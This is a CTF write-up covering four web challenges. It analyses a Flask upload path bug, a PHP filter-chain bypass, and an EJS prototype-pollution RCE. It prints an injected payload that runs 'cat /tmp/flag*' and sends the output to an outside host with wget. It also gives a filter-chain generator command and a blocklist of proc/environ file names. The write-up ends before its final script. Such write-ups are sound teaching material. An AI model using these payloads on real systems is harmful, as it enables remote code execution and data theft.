## Watermelon

  All love for Watermelons üçâüçâüçâ

Lets fire up the docker container and start reviewing the code. Seemed like a very minimilistic app with a few features to login/signup and then we can basically upload a file. 
Reviewing the file upload functionality, we know that it can't be a shell since its Python and it wouldn't make sense to do so. Lets have a close look:
```python
@app.route("/upload", methods=["POST"])
@login_required
def upload_file():
    if 'file' not in request.files:
        return jsonify({"Error": "No file part"}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"Error": "No selected file"}), 400
    
    user_id = session.get('user_id')
    if file:
        blocked = ["proc", "self", "environ", "env"]
        filename = file.filename

        if filename in blocked:
            return jsonify({"Error":"Why?"})

        user_dir = os.path.join(app.config['UPLOAD_FOLDER'], str(user_id))
        os.makedirs(user_dir, exist_ok=True)
        

        file_path = os.path.join(user_dir, filename)

        file.save(f"{user_dir}/{secure_filename(filename)}")
        

        new_file = File(filename=secure_filename(filename), filepath=file_path, user_id=user_id)
        db.session.add(new_file)
        db.session.commit()
        
        return jsonify({"Message": "File uploaded successfully", "file_path": file_path}), 201

    return jsonify({"Error": "File upload failed"}), 500
```

The function `secure_filename` is being called whenever we are saving a file. But wait a sec, the variable `filepath` is insecure since the function is not called on this. 
Moreover the `filepath` variable is then stored into the database on the following line:
```python
new_file = File(filename=secure_filename(filename), filepath=file_path, user_id=user_id)
```

## Free Flag

  Free Free

Download the source code and started a local container. Reviewing the source code, we have a very simple `PHP` to give filename that can be accessed on the local system: 
```php
if(isset($_POST['file']))
{
    if(isRateLimited())
    {
        die("Limited 1 req per second");
    }
    $file = $_POST['file'];
    if(substr(file_get_contents($file),0,5) !== "<?php" && substr(file_get_contents($file),0,5) !== "<html") # i will let you only read my source haha
    {
        die("catched");
    }
    else
    {
        echo file_get_contents($file);
    }
}
```

But the catch here we can only get the file data when the file starts with either `<?php` or `<html`. Hence, we can't simply request the `/flag.txt` file. 
And the function `file_get_contents` only returns back the data inside file unlike `include` which executes the data. So, we need a way to bypass the line:
```php
if(substr(file_get_contents($file),0,5) !== "<?php" && substr(file_get_contents($file),0,5) !== "<html")
```

In `PHP` we have URI schemes like `php://input` or `php://filter`. My initial payload was to set the filename as `php://input` and read data from the raw `POST` request.
But that wouldn't work because we can only read data from the POST and not a file:
```php
<?php something&file=php://input
```
![image](https://github.com/user-attachments/assets/0fdd669c-f615-4b5a-b42c-1d3e0679379a)

Now, digging and looking at my notes. We have a way to inject PHP code from url using `php://filter` chain. We can generate a chain with this tool here:
https://github.com/synacktiv/php_filter_chain_generator
```bash
python3 php_filter_chain_generator.py --chain '<?php ...payloadhere; ?>  '
```

## Notey

  I created a note sharing website for everyone to talk to themselves secretly. Don't try to access others notes, grass isn't greener :'( )

Downloaded the source code and started reviewing the code. During the initial setup of the challenge, i faced one major issue and that was `pwnjail`. This was totally new to me. 
If you look at the `Dockerfile`, you would find this part:
```Dockerfile
FROM pwn.red/jail
COPY --from=final / /srv
COPY docker-entrypoint.sh /srv/app/run
COPY hook.sh /jail/hook.sh
RUN chmod +x /srv/app/run /jail/hook.sh && \

    echo "127.0.0.1 debuerreotype localhost app" >> /srv/etc/hosts
ENV JAIL_PIDS=0 JAIL_CPU=0 JAIL_MEM=0 JAIL_TIME=0 JAIL_TMP_SIZE=100M JAIL_DEV=null,zero,urandom
```

With `pwnjail`, the problem is the `filesystem` state is maintained only for a few seconds and then its discarded. Or in other words, i can't simply just do the 
exploitation steps manually by logging in and then using that token to do some other stuff. Because by the time, i would reach to second request, my token would have
long gone. 

So, we need to write a script. But before jump into the script part. Lets explore the code to see where the vulnerability is. Coming from the point of **Sources & Sinks**, 
first thing i noticed was extended url parameters:
```javascript
app.use(bodyParser.urlencoded({
 extended: true
}))
```

The functions `signup`, `login` and `addNote` doesn't seem to be vulnerable at because of the middleware `addNote` and `login`. Inside these middlewares, there's a check for
the incoming data. The parameters have to be `strings`:
```javascript

{
    return res.status(400).send("Wrong data format");
}
```

The only potential function we are left with is `viewNote` function. This function doesn't have any validation on incoming data. Lets have a close look:

## Fastest Delivery Service

  No time for description, I had some orders to deliver : D 
  Note: The code provided is without jailing, please note that when writing exploits.

Again, we are dealing with `pwnjail` here. So, we will need to write a script in order to fully exploit the instance URL. This challenge was basically inspired from
some of the challenges that have been already given in other CTFs. We are dealing with a RCE here in EJS that can be exploited through prototype pollution. 

Reading the `package.json` file, we know that `EJS` is being used here:
```
"dependencies": {
  "express": "^4.18.2",
  "body-parser": "^1.20.1",
  "ejs":"^3.1.9",
  "express-session":"^1.18.0"
}
```

Now, we need to find the entry point for prototype pollution here. Inspecing the source code, the `/register` endpoint writes the `username` to the `users` `Object`:
```javascript
app.post('/register', (req, res) => {
    const { username, password } = req.body;

    if (Object.prototype.hasOwnProperty.call(users, username)) {
        res.send('Username already exists. <a href="/register">Try a different username</a>.');
    } else {
        users[username] = { password, orders: [], address: '' };
        req.session.user = { username };
        res.redirect(`/address`);
    }
});
```

But the main question is how we are going to provide the payload to `username` `__proto__`. Looking further, we have the `/address` endpoint here: 
```javascript
app.post('/address', (req, res) => {
    const { user } = req.session;
    const { addressId, Fulladdress } = req.body;

    if (user && users[user.username]) {
        addresses[user.username][addressId] = Fulladdress;
        users[user.username].address = addressId;
        res.redirect('/login');
    } else {
        res.redirect('/register');
    }
});
```

This function can be exploited to provide the values to the `__proto__` parameter on `users` object. But before we head to exploit, we need to understand the vulnerability in EJS.
I found a couple writeups on this here: 

https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/

Reading this, i got that we need to introduce 2 values on the `prototype` of object which are:
```
client=1
escape=1;return process.mainModule.require("child_process").execSync("wget https://www.google.com/$(cat /tmp/flag*)")
```

We can exploit this challenge in 3 steps:

* Register a user with `__proto__` username.
* Set the address with `addressId` as `client` and `Fulladdress` as `1`
* Set the address with `addressId` as `escape` and `Fulladdress` as the payload.

Here's the final script i wrote and got the flag on my `webhook` after running it a few times:
